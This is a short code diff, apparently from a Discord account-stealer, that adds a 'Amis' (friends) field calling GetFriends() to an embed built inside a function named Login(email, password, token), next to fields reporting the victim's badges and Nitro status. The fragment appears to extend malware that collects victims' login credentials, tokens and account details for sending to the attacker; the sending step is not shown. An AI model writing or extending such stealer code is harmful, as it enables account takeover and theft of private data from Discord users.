@@ -198,6 +198,11 @@ function Login(email, password, token) {
                             "inline": false
                         },
                         {
+                          "name": "**Amis**",
+                          "value": `${GetFriends()}`,
+                          "inline": false
+                        },
+                        {
                             "name": "**Badges**",
                             "value": `${GetBadges(json.flags)} ${GetNitro(json.premium_type)}`,
                             "inline": true
